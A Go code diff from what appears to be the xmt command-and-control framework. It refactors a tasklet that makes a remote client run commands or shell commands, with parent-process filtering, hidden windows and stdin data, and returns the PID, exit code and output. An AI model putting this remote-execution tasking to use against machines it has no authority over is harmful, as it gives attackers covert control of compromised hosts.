@@ -8,16 +8,55 @@ import (
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
+	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
 )
 
-// Process is a struct that is similar to the 'cmd.Process' struct. This is
-// used to Task a Client with running a specified command. These can be
-// submitted to the Execute tasklet.
+// Process is a Tasklet that is similar to the 'cmd.Process' struct. This is
+// used to Task a Client with running a specified command.
+//
+// This can be directly used in the Session 'Tasklet' function instead of
+// directly creating a Task.
+//
+// The Filter attribute will attempt to set the target that runs the Process.
+// If none are specified, the Process will be ran under the client process.
+//
+// C2 Details:
+//  ID: TvExecute
+//
+//  Input:
+//      Process struct {
+//          []string        // Args
+//          string          // Dir
+//          []string        // Environment
+//          uint32          // Flags
+//          bool            // Wait
+//          int64           // Timeout
+//          Filter struct { // Filter
+//              bool        // Filter Status
+//              uint32      // PID
+//              bool        // Fallback
+//              uint8       // Session
+//              uint8       // Elevated
+//              []string    // Exclude
+//              []string    // Include
+//          }
+//          []byte          // Stdin Data
+//      }
+//  Output:
+//      uint32              // PID
+//      int32               // Exit Code
+//      []byte              // Output (Stdout and Stderr)
+//
+// C2 Client Command:
+//  <command...>
+//  run <command...>
+//  hup <command...>
+//  shell <command...>
 type Process struct {
-	Filter *cmd.Filter
+	Filter *filter.Filter
 	Dir    string
 
 	Env, Args []string
@@ -28,142 +67,47 @@ type Process struct {
 	Wait, Hide bool
 }
 
-// Run will create a Task that will instruct the client to run a command. This
-// command will parsed using the 'cmd.Split' function.
+// Run will create a Tasklet that will instruct the client to run a command.
+// This command will parsed using the 'cmd.Split' function.
 //
-// This command will run under the current process and will wait until completion.
-// Use the 'RunEx' function instead to change this behavior.
+// The Filter attribute will attempt to set the target that runs the Process.
+// If none are specified, the Process will be ran under the client process.
 //
-// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
-//
-// C2 Details:
-//  ID: TvExecute
-//
-//  Input:
-//      - task.Process struct
-//        - []string (Args)
-//        - string (Dir)
-//        - []string (Env)
-//        - uint32 (Flags)
-//        - int64 (Timeout)
-//        - bool (Hide)
-//        - bool (Filer != nil)
-//        - Filter
-//        - []byte (Stdin)
-//  Output:
-//      - uint32 (pid)
-//      - int32 (exit code)
-//      - bytes........ (stdout+stderr)
-func Run(c string) *com.Packet {
-	return RunEx(&Process{Args: cmd.Split(c), Wait: true})
-}
-
-// RunEx will create a Task that will instruct the client to run the command and
-// options specified in the Process struct.
-//
-// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
+// The response to this task will return the PID, ExitCode and Stdout/Stderr
+// data.
 //
 // C2 Details:
 //  ID: TvExecute
 //
 //  Input:
-//      - task.Process struct
-//        - []string (Args)
-//        - string (Dir)
-//        - []string (Env)
-//        - uint32 (Flags)
-//        - int64 (Timeout)
-//        - bool (Hide)
-//        - bool (Filer != nil)
-//        - Filter
-//        - []byte (Stdin)
+//      Process struct {
+//          []string        // Args
+//          string          // Dir
+//          []string        // Environment
+//          uint32          // Flags
+//          bool            // Wait
+//          int64           // Timeout
+//          Filter struct { // Filter
+//              bool        // Filter Status
+//              uint32      // PID
+//              bool        // Fallback
+//              uint8       // Session
+//              uint8       // Elevated
+//              []string    // Exclude
+//              []string    // Include
+//          }
+//          []byte          // Stdin Data
+//      }
 //  Output:
-//      - uint32 (pid)
-//      - int32 (exit code)
-//      - bytes........ (stdout+stderr)
-func RunEx(p *Process) *com.Packet {
-	if p == nil {
-		return nil
-	}
-	n := &com.Packet{ID: TvExecute}
-	p.MarshalStream(n)
-	return n
-}
-
-// RunShell will create a Task that will instruct the client to run a shell
-// command. The command will be passed as an argument to the default shell
-// found on the device.
+//      uint32              // PID
+//      int32               // Exit Code
+//      []byte              // Output (Stdout and Stderr)
 //
-// This command will run under the current process and will wait until
-// completion. Use the 'RunEx' function instead to change this behavior.
-//
-// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
-//
-// C2 Details:
-//  ID: TvExecute
-//
-//  Input:
-//      - task.Process struct
-//        - []string (Args)
-//        - string (Dir)
-//        - []string (Env)
-//        - uint32 (Flags)
-//        - int64 (Timeout)
-//        - bool (Hide)
-//        - bool (Filer != nil)
-//        - Filter
-//        - []byte (Stdin)
-//  Output:
-//      - uint32 (pid)
-//      - int32 (exit code)
-//      - bytes........ (stdout+stderr)
-func RunShell(c string) *com.Packet {
-	return RunEx(&Process{Args: []string{"@SHELL@", c}, Wait: true})
-}
-
-// SetFlags will set the startup Flag values used for Windows programs. This
-// function overrites many of the 'Set*' functions.
-func (p *Process) SetFlags(f uint32) {
-	p.Flags = f
-}
-
-// RunArgs will create a Task that will instruct the client to run a command.
-// This command and args are the supplied vardict of strings.
-//
-// This command will run under the current process and will wait until completion.
-// Use the 'RunEx' function instead to change this behavior.
-//
-// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
-//
-// C2 Details:
-//  ID: TvExecute
-//
-//  Input:
-//      - task.Process struct
-//        - []string (Args)
-//        - string (Dir)
-//        - []string (Env)
-//        - uint32 (Flags)
-//        - int64 (Timeout)
-//        - bool (Hide)
-//        - bool (Filer != nil)
-//        - Filter
-//        - []byte (Stdin)
-//  Output:
-//      - uint32 (pid)
-//      - int32 (exit code)
-//      - bytes........ (stdout+stderr)
-func RunArgs(c ...string) *com.Packet {
-	return RunEx(&Process{Args: c, Wait: true})
-}
-
-// SetParent will instruct the Process to choose a parent with the supplied
-// process Filter. If the Filter is nil this will use the current process (default).
-// Setting the Parent process will automatically set 'SetNewConsole' to true
-//
-// This function has no effect if the device is not running Windows.
-func (p *Process) SetParent(f *cmd.Filter) {
-	p.Filter = f
+// C2 Client Command:
+//  <command...>
+//  run <command...>
+func Run(c string) Process {
+	return Process{Args: cmd.Split(c), Wait: true}
 }
 
 // SetStdin wil attempt to read all the data from the supplied reader to fill
@@ -176,8 +120,51 @@ func (p *Process) SetStdin(r io.Reader) error {
 	return err
 }
 
+// Packet will take the configured Process options and will return a Packet
+// and any errors that may occur during building.
+//
+// This allows Process to fulfil the 'Tasklet' interface.
+//
+// C2 Details:
+//  ID: TvAssembly
+//
+//  Input:
+//      Process struct {
+//          []string        // Args
+//          string          // Dir
+//          []string        // Environment
+//          uint32          // Flags
+//          bool            // Wait
+//          int64           // Timeout
+//          Filter struct { // Filter
+//              bool        // Filter Status
+//              uint32      // PID
+//              bool        // Fallback
+//              uint8       // Session
+//              uint8       // Elevated
+//              []string    // Exclude
+//              []string    // Include
+//          }
+//          []byte          // Stdin Data
+//      }
+//  Output:
+//      uint32              // PID
+//      int32               // Exit Code
+//      []byte              // Output (Stdout and Stderr)
+//
+// C2 Client Command:
+//  <command...>
+//  run <command...>
+//  hup <command...>
+//  shell <command...>
+func (p Process) Packet() (*com.Packet, error) {
+	n := &com.Packet{ID: TvExecute}
+	p.MarshalStream(n)
+	return n, nil
+}
+
 // MarshalStream writes the data for this Process to the supplied Writer.
-func (p *Process) MarshalStream(w data.Writer) error {
+func (p Process) MarshalStream(w data.Writer) error {
 	if err := data.WriteStringList(w, p.Args); err != nil {
 		return err
 	}
@@ -199,17 +186,8 @@ func (p *Process) MarshalStream(w data.Writer) error {
 	if err := w.WriteBool(p.Hide); err != nil {
 		return err
 	}
-	if p.Filter != nil {
-		if err := w.WriteBool(true); err != nil {
-			return err
-		}
-		if err := p.Filter.MarshalStream(w); err != nil {
-			return err
-		}
-	} else {
-		if err := w.WriteBool(false); err != nil {
-			return err
-		}
+	if err := p.Filter.MarshalStream(w); err != nil {
+		return err
 	}
 	if err := w.WriteBytes(p.Stdin); err != nil {
 		return err
@@ -240,66 +218,76 @@ func (p *Process) UnmarshalStream(r data.Reader) error {
 	if err := r.ReadBool(&p.Hide); err != nil {
 		return err
 	}
-	if f, err := r.Bool(); err != nil {
+	if err := p.Filter.UnmarshalStream(r); err != nil {
 		return err
-	} else if f {
-		p.Filter = new(cmd.Filter)
-		if err = p.Filter.UnmarshalStream(r); err != nil {
-			return err
-		}
 	}
 	if err := r.ReadBytes(&p.Stdin); err != nil {
 		return err
 	}
 	return nil
 }
-func execute(x context.Context, r data.Reader, w data.Writer) error {
-	var (
-		e   Process
-		err = e.UnmarshalStream(r)
-	)
+func taskProcess(x context.Context, r data.Reader, w data.Writer) error {
+	p, z, err := ProcessUnmarshal(x, r)
 	if err != nil {
 		return err
 	}
-	if len(e.Args) == 0 {
-		return cmd.ErrEmptyCommand
-	}
-	var (
-		p = cmd.NewProcessContext(x, e.Args...)
-		o bytes.Buffer
-	)
-	if e.Args[0] == "@SHELL@" {
-		p.Args = []string{device.Shell}
-		p.Args = append(p.Args, device.ShellArgs...)
-		p.Args = append(p.Args, strings.Join(e.Args[1:], " "))
-	}
-	if p.SetFlags(e.Flags); e.Hide {
-		p.SetWindowDisplay(0)
-	}
-	if p.SetParent(e.Filter); len(e.Stdin) > 0 {
-		p.Stdin = bytes.NewReader(e.Stdin)
-	}
-	if p.Timeout, p.Dir, p.Env = e.Timeout, e.Dir, e.Env; e.Wait {
-		p.Stdout = &o
-		p.Stderr = &o
+	if z {
+		w.WriteUint64(0)
+		p.Stdout, p.Stderr = w, w
 	}
 	if err = p.Start(); err != nil {
 		p.Stdout, p.Stderr = nil, nil
 		return err
 	}
-	p.Stdin = nil
-	if w.WriteUint32(p.Pid()); !e.Wait {
-		w.WriteInt32(0)
+	if p.Stdin = nil; !z {
+		// NOTE(dij): Push PID 32bits higher, since exit code is zero anyway.
+		w.WriteUint64(uint64(p.Pid()) << 32)
+		p.Release()
 		return nil
 	}
+	i := p.Pid()
 	err = p.Wait()
+	p.Stdout, p.Stderr = nil, nil
 	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
 		return err
 	}
-	p.Stdout, p.Stderr = nil, nil
-	c, _ := p.ExitCode()
-	w.WriteInt32(c)
-	io.Copy(w, &o)
-	o.Reset()
+	var (
+		c, _ = p.ExitCode()
+		s    = w.(backer)
+		//     ^ This should NEVER panic!
+	)
+	// NOTE(dij): The below is kinda super-hacky, and I hate it, but I really
+	//            don't want to put in effort to make Seek work for Chunk
+	//            writes *shrug*
+	o := s.Payload()
+	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
+	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
 	return nil
+}
+
+// ProcessUnmarshal will read this Processes's struct data from the supplied
+// reader and returns a Process runnable struct along with the wait boolean.
+//
+// This function returns an error if building or reading fails.
+func ProcessUnmarshal(x context.Context, r data.Reader) (*cmd.Process, bool, error) {
+	var p Process
+	if err := p.UnmarshalStream(r); err != nil {
+		return nil, false, err
+	}
+	if len(p.Args) == 0 {
+		return nil, false, cmd.ErrEmptyCommand
+	}
+	v := cmd.NewProcessContext(x, p.Args...)
+	if len(p.Args[0]) == 7 && p.Args[0][0] == '@' && p.Args[0][6] == '@' && p.Args[0][1] == 'S' && p.Args[0][5] == 'L' {
+		v.Args = []string{device.Shell, device.ShellArgs, strings.Join(p.Args[1:], " ")}
+	}
+	if v.SetFlags(p.Flags); p.Hide {
+		v.SetNoWindow(true)
+		v.SetWindowDisplay(0)
+	}
+	if v.SetParent(p.Filter); len(p.Stdin) > 0 {
+		v.Stdin = bytes.NewReader(p.Stdin)
+	}
+	v.Timeout, v.Dir, v.Env = p.Timeout, p.Dir, p.Env
+	return v, p.Wait, nil
 }
